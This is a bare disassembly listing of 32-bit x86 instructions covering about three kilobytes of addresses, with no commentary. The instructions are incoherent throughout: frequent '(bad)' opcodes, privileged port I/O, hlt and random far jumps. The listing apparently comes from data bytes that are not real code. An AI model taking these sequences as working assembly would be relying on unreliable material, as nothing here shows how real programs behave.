  419d44:	mov    dl,0x65
  419d46:	mov    eax,ds:0x6b16bc54
  419d4b:	je     0x419d68
  419d4d:	call   0xbb58f6eb
  419d52:	nop
  419d53:	adc    ebp,DWORD PTR [edi-0x7b6e6270]
  419d59:	gs out dx,al
  419d5b:	push   edx
  419d5c:	dec    edx
  419d5d:	mov    esp,0x371bd38e
  419d62:	sar    BYTE PTR [ecx],1
  419d64:	cmp    esp,DWORD PTR [esi-0x3c403551]
  419d6a:	shr    BYTE PTR [ebx-0x6558570f],1
  419d70:	outs   dx,DWORD PTR ds:[esi]
  419d71:	fisub  WORD PTR [ecx-0x69a8e81f]
  419d77:	xor    dl,BYTE PTR [ecx+0x714e90cf]
  419d7d:	inc    ebp
  419d7e:	cmp    ch,BYTE PTR [edx]
  419d80:	test   ch,0x69
  419d83:	dec    edx
  419d84:	enter  0xcfed,0xa2
  419d88:	inc    ebx
  419d89:	dec    edx
  419d8a:	pop    esp
  419d8b:	sti    
  419d8c:	fwait
  419d8d:	pop    eax
  419d8e:	dec    ebp
  419d8f:	xor    eax,0x3c239ca3
  419d94:	dec    ebp
  419d95:	fisub  WORD PTR ds:0x577cc47a
  419d9b:	aaa    
  419d9c:	mov    ah,0x74
  419d9e:	nop
  419d9f:	mov    ebp,0xa0831182
  419da4:	imul   edi,DWORD PTR [esi-0x72],0x4c
  419da8:	addr16 mov ecx,0x17c6144b
  419dae:	lock loop 0x419d5d
  419db1:	xchg   ebp,eax
  419db2:	xchg   ebx,eax
  419db3:	and    bh,BYTE PTR [eax+0x5f09638a]
  419db9:	lea    esi,[ebx-0x465175d6]
  419dbf:	(bad)  
  419dc0:	shr    esp,cl
  419dc2:	inc    ebx
  419dc3:	aas    
  419dc4:	pop    ebp
  419dc5:	outs   dx,BYTE PTR ds:[esi]
  419dc6:	mov    cl,0x48
  419dc8:	fcmovbe st,st(7)
  419dca:	fld    TBYTE PTR [ecx]
  419dcc:	pop    edx
  419dcd:	fxch   st(2)
  419dcf:	je     0x419d85
  419dd1:	(bad)  [eax]
  419dd3:	retf   
  419dd4:	mov    al,0x6f
  419dd6:	xchg   esi,eax
  419dd7:	sti    
  419dd8:	add    bl,dh
  419dda:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  419ddc:	in     eax,0xee
  419dde:	pop    ds
  419ddf:	sbb    al,0x3c
  419de1:	pop    edx
  419de2:	nop
  419de3:	je     0x419d7a
  419de5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419de6:	inc    ecx
  419de7:	popf   
  419de8:	and    eax,0x10bf3670
  419ded:	jle    0x419e04
  419def:	in     eax,0x53
  419df1:	fidivr WORD PTR [ebp-0xd]
  419df4:	and    dh,BYTE PTR [esi-0x7d]
  419df7:	dec    edi
  419df8:	arpl   WORD PTR [eax-0x18431d70],bx
  419dfe:	mov    bh,0xe9
  419e00:	xchg   esi,eax
  419e01:	sbb    dl,BYTE PTR ds:0x4ec44666
  419e07:	or     dh,BYTE PTR [ebp-0x5b]
  419e0a:	mov    ebx,0x90496c82
  419e0f:	mov    dl,0xa1
  419e11:	mov    ds:0xce19bb2a,al
  419e16:	inc    edi
  419e17:	dec    edx
  419e18:	cmp    edx,ebp
  419e1a:	adc    ebx,edi
  419e1c:	retf   0x1d34
  419e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e21:	or     ch,BYTE PTR [edi+0x2be0da97]
  419e27:	fnsave [ecx]
  419e29:	jbe    0x419e96
  419e2b:	xor    ecx,edi
  419e2d:	push   esp
  419e2e:	or     BYTE PTR [edx+0x22],0x11
  419e32:	mov    al,ds:0xe30b8a61
  419e37:	leave  
  419e38:	fwait
  419e39:	retf   
  419e3a:	loope  0x419e93
  419e3c:	xchg   ecx,eax
  419e3d:	dec    esi
  419e3e:	in     eax,0x6f
  419e40:	fiadd  WORD PTR ss:[edx-0x5deca3c9]
  419e47:	mov    al,0xfe
  419e49:	push   ss
  419e4a:	or     eax,0x15889ef1
  419e4f:	aad    0xf6
  419e51:	ins    BYTE PTR es:[edi],dx
  419e52:	mov    bl,0x29
  419e54:	les    edx,FWORD PTR [ebp+eiz*2+0x687e034b]
  419e5b:	pop    ebp
  419e5c:	cdq    
  419e5d:	fxch   st(1)
  419e5f:	mov    DWORD PTR [edi-0x2d],esp
  419e62:	test   eax,0xf7539bc2
  419e67:	into   
  419e68:	mov    ch,0x47
  419e6a:	mov    al,ds:0x69de0b8c
  419e6f:	sbb    cl,bh
  419e71:	sub    al,0x8b
  419e74:	or     bh,BYTE PTR [ecx]
  419e76:	xchg   edi,eax
  419e77:	int    0xf
  419e79:	aas    
  419e7a:	push   ds
  419e7b:	and    BYTE PTR [ebx-0x477ac955],cl
  419e81:	fnsave [ecx]
  419e83:	ss mov edi,0xc5ff9bc7
  419e89:	jb     0x419e1c
  419e8b:	pusha  
  419e8c:	sub    bh,BYTE PTR [edx+0x1e]
  419e8f:	cmp    eax,0xc6809018
  419e94:	xchg   esi,eax
  419e95:	fisubr WORD PTR [ebp+0x7b]
  419e98:	or     DWORD PTR [esi+0x5f],esi
  419e9b:	ds retf 0x9180
  419e9f:	push   ebp
  419ea0:	xor    DWORD PTR [edx+0x4572ceff],0xddea7bc0
  419eaa:	repnz mov bl,0x1a
  419ead:	adc    ecx,ebp
  419eaf:	jg     0x419edd
  419eb1:	jno    0x419e45
  419eb3:	push   esp
  419eb4:	mov    al,ds:0xf8021830
  419eb9:	and    dl,cl
  419ebb:	cmp    esi,edx
  419ebd:	leave  
  419ebe:	adc    al,0x4a
  419ec0:	mov    dl,0xad
  419ec2:	pop    ds
  419ec3:	fs push es
  419ec5:	sbb    ah,ah
  419ec7:	sti    
  419ec8:	sbb    BYTE PTR [esi-0x48be3c70],ah
  419ece:	cmp    eax,0x708bae29
  419ed3:	dec    edx
  419ed4:	popa   
  419ed5:	push   es
  419ed6:	cwde   
  419ed7:	cmp    ch,BYTE PTR [ecx-0x6a5fb1f2]
  419edd:	adc    eax,0x5975de90
  419ee2:	neg    DWORD PTR [edi]
  419ee4:	(bad)  
  419ee5:	mov    bh,cl
  419ee7:	dec    ecx
  419ee8:	lods   al,BYTE PTR ds:[esi]
  419ee9:	adc    BYTE PTR [eax],0xda
  419eec:	cmp    cl,ah
  419eee:	shl    BYTE PTR [edx+ebp*4-0x16],1
  419ef2:	fs push es
  419ef4:	(bad)  
  419ef5:	and    al,0xee
  419ef7:	int3   
  419ef8:	fwait
  419ef9:	sub    al,0x0
  419efb:	mov    dl,0x5d
  419efd:	fmulp  st(2),st
  419eff:	repz fidivr WORD PTR [ecx-0xf]
  419f03:	pop    ebp
  419f04:	das    
  419f05:	sub    DWORD PTR [ecx-0x76774ea2],edx
  419f0b:	mulps  xmm5,XMMWORD PTR [esi]
  419f0e:	pop    eax
  419f0f:	inc    eax
  419f10:	sbb    ebx,esi
  419f12:	test   eax,0x190bbb05
  419f17:	sbb    eax,0x8cc804dc
  419f1c:	scas   al,BYTE PTR es:[edi]
  419f1d:	cli    
  419f1e:	(bad)  
  419f1f:	push   es
  419f20:	fucomi st,st(4)
  419f22:	and    DWORD PTR [ebx],edi
  419f24:	jp     0x419ee0
  419f26:	popa   
  419f27:	dec    edx
  419f28:	pop    esi
  419f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f2a:	push   es
  419f2b:	inc    edi
  419f2c:	cmp    bh,BYTE PTR [eax-0x1864aaaa]
  419f32:	push   esi
  419f33:	xchg   ebp,eax
  419f34:	fsubr  QWORD PTR [edx+0x5f]
  419f37:	sbb    bl,bh
  419f39:	fld    QWORD PTR [esi]
  419f3b:	push   cs
  419f3c:	fldcw  WORD PTR [edi-0x7cd5d672]
  419f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f43:	add    al,BYTE PTR [ebp-0x14]
  419f46:	jns    0x419f0f
  419f48:	fwait
  419f49:	jnp    0x419f43
  419f4b:	and    eax,0xbb034ad4
  419f50:	push   edx
  419f51:	loope  0x419f2f
  419f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f54:	lea    edx,[esi+0x2f]
  419f57:	mov    ecx,0xfb8f0123
  419f5c:	jg     0x419fd0
  419f5e:	nop
  419f5f:	push   0x17df2093
  419f64:	out    dx,al
  419f65:	hlt    
  419f66:	inc    ebx
  419f67:	dec    edx
  419f68:	inc    esp
  419f69:	push   cs
  419f6a:	add    DWORD PTR [esi+edx*8-0x68a9670d],edx
  419f71:	inc    ecx
  419f72:	jp     0x419fc1
  419f74:	fwait
  419f75:	pop    eax
  419f76:	pop    edi
  419f77:	mov    bh,0x57
  419f79:	leave  
  419f7a:	xchg   eax,ebx
  419f7c:	fisubr WORD PTR ss:[ebx]
  419f7f:	xchg   ebx,eax
  419f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f81:	arpl   sp,cx
  419f83:	cdq    
  419f84:	retf   
  419f85:	popf   
  419f86:	nop
  419f87:	dec    ebp
  419f88:	jle    0x419f19
  419f8a:	mov    ds:0x5b17240f,al
  419f8f:	dec    edx
  419f90:	jno    0x419fcf
  419f92:	dec    edx
  419f93:	adc    dh,BYTE PTR [ecx+ecx*4]
  419f96:	mov    esi,0x6f5c9b1e
  419f9b:	clc    
  419f9c:	lea    esi,[esp+ebx*2+0x7e]
  419fa0:	add    eax,0x8c5a0fde
  419fa5:	imul   ecx,DWORD PTR [ebp-0x6fb8ed04],0x12
  419fac:	in     eax,0x74
  419fae:	or     ch,ah
  419fb0:	and    ebp,eax
  419fb2:	cld    
  419fb3:	aas    
  419fb4:	popa   
  419fb5:	push   ebx
  419fb6:	ror    DWORD PTR [ecx+0x7c],1
  419fb9:	pop    ebp
  419fba:	ss pop esi
  419fbc:	aam    0x1c
  419fbe:	add    al,ah
  419fc0:	mov    edx,0xdbd330a5
  419fc5:	ret    0xec7c
  419fc8:	dec    edi
  419fc9:	jne    0x419fff
  419fcb:	dec    ebx
  419fcc:	dec    ebx
  419fcd:	mov    ah,BYTE PTR ds:0x536deb35
  419fd3:	push   ss
  419fd4:	ss mov bl,0x90
  419fd7:	and    al,0x2f
  419fd9:	ficomp DWORD PTR [ebx-0x52e1df5]
  419fdf:	dec    ecx
  419fe0:	adc    bl,bh
  419fe2:	cmp    BYTE PTR [ebx-0x696375ab],al
  419fe8:	fwait
  419fe9:	out    dx,al
  419fea:	hlt    
  419feb:	loopne 0x419f8a
  419fed:	iret   
  419fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fef:	inc    DWORD PTR [ebp+0x5dd93dde]
  419ff5:	push   ds
  419ff6:	push   esp
  419ff7:	sbb    eax,0x6a91bcc8
  419ffc:	adc    DWORD PTR [ecx+edi*4-0x37],0xffffffe6
  41a001:	or     DWORD PTR [ebp+eiz*8-0x5c],edx
  41a005:	in     al,dx
  41a006:	(bad)  
  41a007:	fcom   DWORD PTR [edi-0x18]
  41a00a:	xor    bl,ah
  41a00c:	pop    ecx
  41a00d:	loope  0x41a079
  41a00f:	inc    esi
  41a010:	mov    dl,0x94
  41a012:	xchg   edx,eax
  41a013:	aam    0xed
  41a015:	pop    es
  41a016:	xchg   esp,eax
  41a017:	inc    ebx
  41a018:	adc    edi,DWORD PTR [esi-0x1374bb2f]
  41a01e:	popf   
  41a01f:	ins    BYTE PTR es:[edi],dx
  41a020:	pop    edi
  41a021:	xor    BYTE PTR [eax-0x41],0xa6
  41a025:	mov    ecx,0xf29bad57
  41a02a:	or     eax,0x1e46985b
  41a02f:	std    
  41a030:	adc    eax,0xce0a0bde
  41a035:	pop    edx
  41a036:	mov    esp,DWORD PTR [ebp-0x33]
  41a039:	test   DWORD PTR [eax-0x6a8a11c4],edx
  41a03f:	js     0x41a04f
  41a041:	cmp    al,BYTE PTR [ecx+edx*2]
  41a044:	das    
  41a045:	test   eax,0xe81ad5a
  41a04a:	lds    ecx,FWORD PTR [ebx+0x7f]
  41a04d:	mov    cl,0x86
  41a04f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a051:	ret    0xec3b
  41a054:	(bad)  
  41a055:	fisubr WORD PTR [edx+0x3817f048]
  41a05b:	dec    esi
  41a05c:	or     al,0xd6
  41a05e:	(bad)  [edi+ecx*2+0x1ad8805e]
  41a065:	mov    dl,0x90
  41a067:	jo     0x41a06b
  41a069:	mov    esi,0xc1bad106
  41a06e:	push   edx
  41a06f:	dec    edx
  41a070:	xor    al,0x13
  41a072:	popf   
  41a073:	je     0x41a0f3
  41a075:	scas   al,BYTE PTR es:[edi]
  41a076:	xchg   esp,eax
  41a077:	(bad)  
  41a078:	test   eax,0x1f866f8
  41a07d:	sahf   
  41a07e:	fdivr  QWORD PTR [edx-0x6d]
  41a081:	and    bl,BYTE PTR [eax-0x2ece0ca9]
  41a087:	mov    ch,0x3b
  41a089:	jnp    0x41a09e
  41a08b:	icebp  
  41a08c:	in     al,0x48
  41a08e:	lods   eax,DWORD PTR ds:[esi]
  41a08f:	cli    
  41a090:	inc    esi
  41a091:	sbb    DWORD PTR [eax-0x4ec621ae],edx
  41a097:	mov    edx,0x3b06de33
  41a09c:	mov    edx,0xcd0c70b0
  41a0a1:	mov    WORD PTR [eax+0x227ff11f],ss
  41a0a7:	inc    ebp
  41a0a8:	leave  
  41a0a9:	xor    al,bl
  41a0ab:	dec    ecx
  41a0ac:	nop
  41a0ad:	push   edx
  41a0ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0af:	fdivr  DWORD PTR [eax]
  41a0b1:	das    
  41a0b2:	je     0x41a0d7
  41a0b4:	mov    ecx,0x1bf6ebdc
  41a0b9:	jne    0x41a11e
  41a0bb:	pop    eax
  41a0bc:	jo     0x41a0d7
  41a0be:	inc    ecx
  41a0bf:	dec    edx
  41a0c0:	mov    ah,0x2a
  41a0c2:	inc    esi
  41a0c3:	popf   
  41a0c4:	ror    ecx,cl
  41a0c6:	sar    esp,1
  41a0c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0c9:	lods   eax,DWORD PTR ds:[esi]
  41a0ca:	ins    DWORD PTR es:[edi],dx
  41a0cb:	inc    ebx
  41a0cc:	add    eax,0xc2dd505e
  41a0d1:	test   eax,0xb8795c8a
  41a0d6:	ss dec edx
  41a0d8:	sub    al,0x25
  41a0da:	mov    al,ds:0x901ace1c
  41a0df:	or     al,0x6a
  41a0e1:	sub    eax,0xc3958c2d
  41a0e6:	xchg   ebx,eax
  41a0e7:	dec    ecx
  41a0e8:	ds stc 
  41a0ea:	js     0x41a0a6
  41a0ec:	stc    
  41a0ed:	cmp    BYTE PTR [esi+0x2c70a211],dh
  41a0f3:	aas    
  41a0f4:	xlat   BYTE PTR ds:[ebx]
  41a0f5:	adc    DWORD PTR [eax],edx
  41a0f7:	push   ebx
  41a0f8:	add    BYTE PTR [edi-0x7c53b657],0x1b
  41a0ff:	mov    ds:0xa944a9e7,eax
  41a104:	mov    esp,DWORD PTR [esi]
  41a106:	nop
  41a107:	pop    ebp
  41a108:	cmp    ebx,DWORD PTR [ebx]
  41a10a:	xchg   ebp,eax
  41a10b:	mov    cl,0x3a
  41a10d:	retf   
  41a10e:	aam    0x49
  41a110:	cmp    BYTE PTR [eax+0x69],bh
  41a113:	xchg   ebp,eax
  41a114:	mov    ds:0xd541d70a,al
  41a119:	add    eax,0xa1e0c9d2
  41a11e:	sbb    DWORD PTR [ebp+0x6a],edi
  41a121:	dec    esi
  41a122:	xchg   edx,eax
  41a123:	dec    edx
  41a124:	mov    ebp,0x19d7e098
  41a129:	push   0xb9573e96
  41a12e:	cmp    BYTE PTR [ebx-0x3f],cl
  41a131:	xor    BYTE PTR [ebx+0x2243afb6],bl
  41a137:	dec    edx
  41a138:	add    al,0xfc
  41a13a:	loope  0x41a1b8
  41a13c:	rcr    ebp,cl
  41a13e:	int    0x5f
  41a140:	sbb    edi,DWORD PTR [eax-0x2c8b6d9]
  41a146:	xchg   edx,eax
  41a147:	sbb    DWORD PTR [edx],ecx
  41a149:	jl     0x41a0dd
  41a14b:	shr    DWORD PTR ds:0xfaefc0a5,1
  41a151:	sbb    al,0x73
  41a153:	popa   
  41a154:	sbb    BYTE PTR [ebx],ch
  41a156:	addr16 dec edx
  41a158:	add    esi,DWORD PTR [esi-0x413db3cf]
  41a15e:	xchg   ecx,eax
  41a15f:	shr    DWORD PTR [edi],cl
  41a161:	cmp    al,BYTE PTR [esi]
  41a163:	sub    edx,ebp
  41a165:	xor    al,0xb0
  41a167:	lds    edx,FWORD PTR [ebx+0x13c396de]
  41a16d:	popf   
  41a16e:	daa    
  41a16f:	xor    dl,al
  41a171:	out    0x98,eax
  41a173:	std    
  41a174:	xor    eax,0x2e4a7f28
  41a179:	dec    eax
  41a17a:	pop    edx
  41a17b:	test   al,0x98
  41a17d:	sti    
  41a17e:	repz mov ch,0x68
  41a181:	push   ds
  41a182:	int3   
  41a183:	xchg   esp,eax
  41a184:	aaa    
  41a185:	or     eax,DWORD PTR [ebp+eiz*2-0x5e]
  41a189:	sub    eax,0x1e3d2cc7
  41a18e:	jo     0x41a1f2
  41a190:	mov    esi,0x9d49d8da
  41a195:	mov    esi,0xf32876aa
  41a19a:	mov    dh,0x8a
  41a19c:	fwait
  41a19d:	xor    BYTE PTR [ecx-0x19b284f],bl
  41a1a3:	gs js  0x41a184
  41a1a6:	or     esi,esi
  41a1a8:	lahf   
  41a1a9:	in     eax,dx
  41a1aa:	ss mov ah,0x4c
  41a1ad:	popa   
  41a1ae:	nop
  41a1af:	inc    edx
  41a1b0:	xchg   BYTE PTR [esi],dh
  41a1b2:	jg     0x41a19d
  41a1b4:	pop    ds
  41a1b5:	imul   eax,DWORD PTR [esi+0x4a],0xc90cbce7
  41a1bc:	lock xor BYTE PTR [esi],ch
  41a1bf:	int3   
  41a1c0:	popf   
  41a1c1:	les    eax,FWORD PTR [eax-0x4b2d9857]
  41a1c7:	sub    DWORD PTR [edi-0x7],edx
  41a1ca:	pop    ss
  41a1cb:	dec    edx
  41a1cc:	daa    
  41a1cd:	(bad)  
  41a1ce:	retf   
  41a1cf:	jo     0x41a24e
  41a1d1:	lods   eax,DWORD PTR ds:[esi]
  41a1d2:	neg    BYTE PTR gs:[ebx+0x397dfdf1]
  41a1d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1da:	fild   WORD PTR [ebp+0x29]
  41a1dd:	ficom  WORD PTR [eax]
  41a1df:	pusha  
  41a1e0:	pusha  
  41a1e1:	imul   ecx,DWORD PTR [edx],0x8a502030
  41a1e7:	mov    ch,0x9b
  41a1e9:	ss mov dh,0xe9
  41a1ec:	out    dx,eax
  41a1ed:	dec    esi
  41a1ee:	mov    dl,0xf4
  41a1f0:	dec    ecx
  41a1f1:	aam    0x68
  41a1f3:	dec    edx
  41a1f4:	mov    ds:0x920ec150,al
  41a1f9:	push   ebp
  41a1fa:	jl     0x41a233
  41a1fc:	fwait
  41a1fd:	inc    esp
  41a1fe:	dec    ecx
  41a1ff:	inc    bx
  41a201:	repnz pop ebx
  41a203:	push   es
  41a204:	pop    esi
  41a205:	push   eax
  41a206:	xlat   BYTE PTR ds:[ebx]
  41a207:	shr    DWORD PTR [ecx-0x4],0xbe
  41a20b:	xor    DWORD PTR [ebx-0x22],0x20
  41a20f:	das    
  41a210:	jmp    0x5708:0x9b5f362b
  41a217:	mov    eax,ds:0x30ec6c15
  41a21c:	cmp    eax,0x9bcc271c
  41a221:	outs   dx,BYTE PTR ds:[esi]
  41a222:	dec    edx
  41a223:	jl     0x41a1b8
  41a225:	test   eax,0x147fb15f
  41a22a:	xchg   ecx,eax
  41a22b:	sbb    dl,BYTE PTR [edi-0x2ff660ca]
  41a231:	pusha  
  41a232:	mov    al,0x68
  41a234:	imul   ebx,esi,0xffffff8e
  41a237:	dec    esp
  41a238:	inc    ecx
  41a239:	mov    cl,0x52
  41a23b:	(bad)  
  41a23c:	neg    DWORD PTR [esi]
  41a23e:	mov    ah,BYTE PTR [ebx+ebx*4-0x56]
  41a242:	dec    esi
  41a243:	and    al,0xbd
  41a245:	jmp    0x41a1d2
  41a247:	xchg   edi,eax
  41a248:	pop    esi
  41a249:	ficom  WORD PTR [edx]
  41a24b:	jmp    0xa737:0x4e4d3014
  41a252:	xchg   ebx,eax
  41a253:	mov    ebp,0x214c9cc8
  41a258:	jne    0x41a2b8
  41a25a:	mov    ds:0x83ec52a5,eax
  41a25f:	inc    esi
  41a260:	xchg   ebp,eax
  41a261:	dec    eax
  41a262:	lock pop ds
  41a264:	shr    DWORD PTR [ebp-0x80],cl
  41a267:	repz fwait
  41a269:	jmp    0xa392:0x3d3d11f0
  41a270:	(bad)  
  41a271:	in     al,0xa9
  41a273:	xchg   ebx,eax
  41a274:	dec    edx
  41a275:	sub    al,0x28
  41a277:	mov    edx,0x76bddee3
  41a27c:	sahf   
  41a27d:	rol    BYTE PTR [ebx+0x35e9bf58],cl
  41a283:	cmp    dl,BYTE PTR [ecx+0x27]
  41a286:	push   0x51
  41a288:	mov    ds:0x57113d2b,eax
  41a28d:	pop    esi
  41a28e:	mov    DWORD PTR [edx+eiz*8],ebp
  41a291:	or     al,0x90
  41a293:	jbe    0x41a28a
  41a295:	inc    esi
  41a296:	mov    ah,0x17
  41a298:	jne    0x41a27b
  41a29a:	ds dec edx
  41a29c:	pop    ebx
  41a29d:	repz xchg esp,eax
  41a29f:	sahf   
  41a2a0:	and    dl,al
  41a2a2:	or     al,0x32
  41a2a4:	test   eax,0xa418a07c
  41a2a9:	sbb    eax,0xa4c4e20
  41a2ae:	mov    WORD PTR [ebx+ecx*1],?
  41a2b1:	in     eax,dx
  41a2b2:	push   es
  41a2b3:	jmp    0x7216:0x37f0170a
  41a2ba:	adc    esi,DWORD PTR [ebx+0x7fc52aa2]
  41a2c0:	add    ecx,esp
  41a2c2:	das    
  41a2c3:	enter  0x1ec8,0x3b
  41a2c7:	dec    edx
  41a2c8:	in     al,0x7c
  41a2ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2cb:	jl     0x41a2c3
  41a2cd:	xchg   DWORD PTR [esi+0x36],esp
  41a2d0:	stos   BYTE PTR es:[edi],al
  41a2d1:	arpl   WORD PTR [ebp+0x23],cx
  41a2d4:	retf   
  41a2d5:	fnstsw WORD PTR [ebp+0x21]
  41a2d8:	fnstenv [esi+eax*4+0x4a]
  41a2dc:	pop    ebp
  41a2dd:	xor    DWORD PTR [edi],ebp
  41a2df:	push   eax
  41a2e0:	imul   ecx,DWORD PTR [edx+esi*8-0x6fe2d454],0xffffffb3
  41a2e8:	xor    DWORD PTR [eax],esp
  41a2ea:	fimul  WORD PTR [ecx]
  41a2ec:	xchg   edx,eax
  41a2ed:	adc    dh,cl
  41a2ef:	dec    ecx
  41a2f0:	sub    BYTE PTR ds:0x5e9a21a5,cl
  41a2f6:	ins    BYTE PTR es:[edi],dx
  41a2f7:	sbb    al,0x9b
  41a2f9:	xchg   BYTE PTR [edx-0x38],cl
  41a2fc:	inc    ebx
  41a2fd:	and    al,0x27
  41a2ff:	test   DWORD PTR [ecx-0x5],0xa0c5ba74
  41a306:	ret    
  41a307:	repz dec ah
  41a30a:	sbb    BYTE PTR [esi],dh
  41a30c:	jnp    0x41a340
  41a30e:	nop
  41a30f:	mov    esi,0x263b0e42
  41a314:	sbb    eax,0xed2e347d
  41a319:	jmp    0x41a357
  41a31b:	cli    
  41a31c:	outs   dx,DWORD PTR ds:[esi]
  41a31d:	lock and esp,DWORD PTR gs:[ebx]
  41a321:	cli    
  41a322:	push   ds
  41a323:	xor    al,0x9c
  41a325:	xor    BYTE PTR [ecx],ch
  41a327:	mov    ebp,0xc5594a18
  41a32c:	cld    
  41a32d:	ret    
  41a32e:	push   eax
  41a32f:	fld    TBYTE PTR [eax+0x7742a8dd]
  41a335:	add    DWORD PTR [edi],ebp
  41a337:	cmp    al,0x9
  41a339:	inc    ebx
  41a33a:	nop
  41a33b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a33c:	test   DWORD PTR [edi+0x2],eax
  41a33f:	cmp    BYTE PTR [edx-0x3ec8632d],bh
  41a345:	frstor [ebx-0x32]
  41a348:	aaa    
  41a349:	sbb    al,0x6
  41a34b:	push   ebp
  41a34c:	push   esp
  41a34d:	rcl    DWORD PTR [eax+0xa6f521],0xbd
  41a354:	lods   eax,DWORD PTR ds:[esi]
  41a355:	xor    dl,BYTE PTR [ecx+0x68]
  41a358:	outs   dx,BYTE PTR ds:[esi]
  41a359:	rol    BYTE PTR [edi],1
  41a35b:	retf   0x11b7
  41a35e:	lahf   
  41a35f:	out    dx,eax
  41a360:	sub    dl,bl
  41a362:	mov    WORD PTR [ecx-0x3f],fs
  41a365:	cmp    al,0xe8
  41a367:	or     bl,BYTE PTR [ebx+0x5e702c7c]
  41a36d:	xchg   ecx,eax
  41a36e:	inc    edi
  41a36f:	dec    edx
  41a370:	popf   
  41a371:	pop    esi
  41a372:	xchg   ebx,eax
  41a373:	arpl   WORD PTR [ecx-0x643d3523],cx
  41a379:	test   DWORD PTR [eax+0xf],edx
  41a37c:	mov    dl,ah
  41a37e:	test   ch,ch
  41a380:	or     ch,ah
  41a382:	(bad)  
  41a383:	push   ecx
  41a384:	mov    esp,0xb5cacc32
  41a389:	scas   eax,DWORD PTR es:[edi]
  41a38a:	clc    
  41a38b:	adc    eax,0x8aacb2f6
  41a390:	aad    0x1c
  41a392:	sub    al,0x8a
  41a394:	fwait
  41a395:	cs xchg esi,eax
  41a397:	mov    bh,0x66
  41a399:	rcl    BYTE PTR [ebx],0x4a
  41a39c:	pop    es
  41a39d:	out    dx,eax
  41a39e:	js     0x41a35c
  41a3a0:	sbb    BYTE PTR [ecx],bh
  41a3a2:	aas    
  41a3a3:	mov    ds:0xd5bbbe9b,al
  41a3a8:	mov    ebx,DWORD PTR [ebp-0x30]
  41a3ab:	mov    dl,0xd6
  41a3ad:	fisttp QWORD PTR [ebp+0x67]
  41a3b0:	in     eax,0xb1
  41a3b2:	xor    eax,0x90ba2a37
  41a3b7:	mov    al,0xe
  41a3b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3ba:	and    BYTE PTR [ebx+0x50fb8798],ah
  41a3c0:	add    al,0x13
  41a3c2:	js     0x41a349
  41a3c4:	pop    eax
  41a3c5:	(bad)  
  41a3c6:	icebp  
  41a3c7:	(bad)  ds:0x8d90
  41a3cc:	xchg   esp,eax
  41a3cd:	jl     0x41a3d8
  41a3cf:	mov    dh,0xe8
  41a3d1:	xlat   BYTE PTR ds:[ebx]
  41a3d2:	sbb    al,0x82
  41a3d4:	imul   ebx,DWORD PTR [ebp-0x1f0fca4a],0xfffffff4
  41a3db:	shl    BYTE PTR [esi],cl
  41a3dd:	stos   BYTE PTR es:[edi],al
  41a3de:	aaa    
  41a3df:	or     cl,BYTE PTR [edx]
  41a3e1:	call   0x6d51:0xfca213e1
  41a3e8:	(bad)  
  41a3e9:	fidiv  DWORD PTR [eax]
  41a3eb:	xchg   BYTE PTR [edx+0x5b66a1db],ah
  41a3f1:	lods   eax,DWORD PTR ds:[esi]
  41a3f2:	cmp    eax,0xde65a7ca
  41a3f7:	in     al,0x6d
  41a3f9:	iret   
  41a3fa:	jl     0x41a46d
  41a3fc:	mov    bh,0x6a
  41a3fe:	cmp    eax,DWORD PTR [ebx]
  41a400:	push   ebp
  41a401:	in     al,dx
  41a402:	and    DWORD PTR [edi],ebx
  41a404:	cmp    dh,bh
  41a406:	inc    ebx
  41a407:	pusha  
  41a408:	ins    BYTE PTR es:[edi],dx
  41a409:	cdq    
  41a40a:	(bad)  
  41a40b:	addr16 cmp al,0xbc
  41a40e:	sbb    DWORD PTR [eax],ebp
  41a410:	push   ecx
  41a411:	push   ds
  41a412:	dec    edi
  41a413:	js     0x41a3bd
  41a415:	add    ah,ah
  41a417:	icebp  
  41a418:	ficom  DWORD PTR [esi-0x5bbab5ca]
  41a41e:	inc    edi
  41a41f:	cdq    
  41a420:	retf   0x2833
  41a423:	dec    edx
  41a424:	mov    dh,0xec
  41a426:	xchg   esi,eax
  41a427:	jo     0x41a417
  41a429:	add    DWORD PTR [esi-0x273361c9],esp
  41a42f:	xor    DWORD PTR [ecx],0x6239c8fb
  41a435:	shl    BYTE PTR ds:0x76c266ea,1
  41a43b:	call   0xfe83:0x530ba65d
  41a442:	jmp    0x78f4:0xe4c79bda
  41a449:	mov    bl,0x9
  41a44b:	pop    edx
  41a44c:	mov    dl,0xf3
  41a44e:	adc    ch,BYTE PTR [ecx-0x58ab9565]
  41a454:	add    ch,BYTE PTR [edi-0x167c4343]
  41a45a:	pushf  
  41a45b:	add    DWORD PTR [esp+ebx*8+0x70f0f110],esi
  41a462:	or     DWORD PTR [ebx-0x65],0xffffff8b
  41a466:	dec    edi
  41a467:	scas   al,BYTE PTR es:[edi]
  41a468:	fiadd  DWORD PTR [edi]
  41a46a:	test   DWORD PTR [eax],ecx
  41a46c:	mov    dh,0xdd
  41a46e:	adc    ah,BYTE PTR [edx-0x1a]
  41a471:	add    esi,DWORD PTR [ebx]
  41a473:	test   eax,0xc9cc7f3b
  41a478:	sub    eax,0x5ca239b
  41a47d:	cmp    BYTE PTR ds:0x32500c59,bl
  41a483:	dec    edx
  41a484:	and    eax,0x751063ff
  41a489:	mov    eax,DWORD PTR [eax-0x31ad557c]
  41a48f:	pop    ss
  41a490:	push   ecx
  41a491:	loope  0x41a416
  41a493:	(bad)  
  41a494:	in     eax,0x85
  41a496:	icebp  
  41a497:	sbb    al,0x82
